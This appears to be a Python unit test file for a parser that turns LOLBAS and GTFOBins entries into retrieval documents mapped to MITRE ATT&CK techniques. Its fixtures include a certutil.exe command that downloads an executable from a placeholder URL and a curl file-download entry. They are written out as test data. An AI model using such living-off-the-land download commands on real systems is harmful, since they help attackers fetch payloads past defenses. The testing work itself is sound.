"""Unit tests for LOLBAS + GTFOBins source integration."""

from pathlib import Path

from cyberred.rag.sources import lolbas


def test_parse_lolbas_yaml_extracts_core_fields_and_techniques():
    yml = """
Name: Certutil.exe
Description: Windows binary used for certificate management
Commands:
  - Command: certutil.exe -urlcache -split -f http://example.com/file.exe file.exe
    Description: Download file from URL
    MitreID: T1105
Full_Path:
  - Path: C:\\Windows\\System32\\certutil.exe
Detection:
  - Sigma: https://example.com/sigma
"""
    doc = lolbas._parse_lolbas_yaml(yml, Path("yml/OSBinaries/Certutil.yml"))
    assert doc is not None
    assert "# LOLBAS: Certutil.exe" in doc["text"]
    assert doc["metadata"]["name"] == "Certutil.exe"
    assert doc["metadata"]["path"] == "yml/OSBinaries/Certutil.yml"
    assert "T1105" in doc["metadata"]["technique_ids"]


def test_parse_lolbas_yaml_handles_malformed_yaml():
    doc = lolbas._parse_lolbas_yaml(": bad: [", Path("yml/OSBinaries/bad.yml"))
    assert doc is None


def test_parse_gtfobins_frontmatter_and_mapping():
    md = """---
functions:
  shell:
    - code: bash
  file-download:
    - code: curl http://example.com
---

Body text here
"""
    doc = lolbas._parse_gtfobins_markdown(md, Path("_gtfobins/bash.md"))
    assert doc is not None
    assert doc["metadata"]["binary"] == "bash"
    # shell -> T1059.004, file-download -> T1105
    assert "T1059.004" in doc["metadata"]["technique_ids"]
    assert "T1105" in doc["metadata"]["technique_ids"]


def test_gtfobins_frontmatter_missing_returns_empty_functions():
    md = "Just some text"
    doc = lolbas._parse_gtfobins_markdown(md, Path("_gtfobins/awk.md"))
    assert doc is not None
    assert doc["metadata"]["functions"] == []
